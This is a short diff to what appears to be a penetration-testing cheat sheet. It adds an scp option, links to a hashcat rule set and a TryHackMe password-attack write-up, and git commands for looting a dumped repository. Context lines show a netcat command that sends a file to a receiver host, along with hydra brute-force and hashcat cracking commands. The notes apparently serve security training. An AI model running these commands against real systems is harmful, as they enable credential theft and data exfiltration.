@@ -20,7 +20,7 @@ cat [file] | nc [receiver_IP] [receiver_port] - Alternative
 
 #### SCP
 
-`scp <file path> $user@$ip:/<where you want to store it>`&#x20;
+`scp [-r] <file path> $user@$ip:/<where you want to store it>`&#x20;
 
 #### Powershell
 
@@ -80,6 +80,10 @@ hydra [-L [userlist.txt] -P [passwordlist.txt]]/[-C [combineduserpassfile]] [IP]
 .\hashcat64.exe -m [mode] hash.txt rockyou.txt -d 1
 ```
 
+{% embed url="https://github.com/stealthsploit/OneRuleToRuleThemStill" %}
+
+{% embed url="https://kevinovitz.github.io/TryHackMe_Writeups/passwordattacks/passwordattacks/#online-password-attacks" %}
+
 ## Looting
 
 ```
@@ -119,5 +123,8 @@ https://github.com/arthaud/git-dumper
 git status
 git diff --cached [file]
 git show <hash> [in logs]
+git restore [file]
+git log
+git checkout [hash]
 
 ```
